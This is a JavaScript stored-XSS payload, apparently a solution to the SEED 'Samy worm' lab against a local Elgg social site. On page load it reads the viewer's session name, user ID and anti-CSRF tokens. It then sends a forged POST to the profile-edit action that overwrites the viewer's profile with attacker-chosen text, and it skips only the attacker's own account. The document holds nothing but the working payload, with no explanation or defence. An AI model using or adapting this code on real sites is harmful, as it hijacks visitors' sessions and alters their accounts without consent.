<script type="text/javascript">
	window.onload = function(){
		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		var name = "&name=" + elgg.session.user.name;
		var guid = "&guid=" + elgg.session.user.guid;

		//and Security Token __elgg_token
		var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
		var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

		var briefDescription = "&briefdescription=1605084" + "&accesslevel[briefdescription]=1";
		var contactEmail = "&contactemail=samyhacker@gmail.com" + "&accesslevel[contactemail]=1";
		var description = "&description=YoThereSamyHackerHere" + "&accesslevel[description]=1";
		var interests = "&interests=Hacking" + "&accesslevel[interests]=1";
		var location = "&location=Dhaka" + "&accesslevel[location]=1";
		var mobile = "&mobile=11111" + "&accesslevel[mobile]=1";
		var phone = "&phone=999999" + "&accesslevel[phone]=1";
		var skills = "&skills=Hacking" + "&accesslevel[skills]=1";
		var twitter = "&twitter=samy_tweets" + "&accesslevel[twitter]=1";
		var website = "&website=http://www.samy.hacker.com" + "&accesslevel[website]=1";

		//Got from browser inspect element --> Network --> Params --> Form Data --> guid
		var samy_guid = 47;
		//current user guid got from printing elgg object
		var current_user_guid = elgg.session.user.guid;

		//Construct the content of POST request profile edit url.
		var sendurl = "http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
		//checked POST request header of the profile/edit request and then concatenate accordingly using the syntax from there
		var contentProfileEdit = token + ts + name + description + briefDescription + location + interests + skills + contactEmail + phone + mobile + website + twitter + guid;

		if(current_user_guid != samy_guid)
		{
			//Create and send Ajax request to modify profile
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(contentProfileEdit);
		}
	}
</script>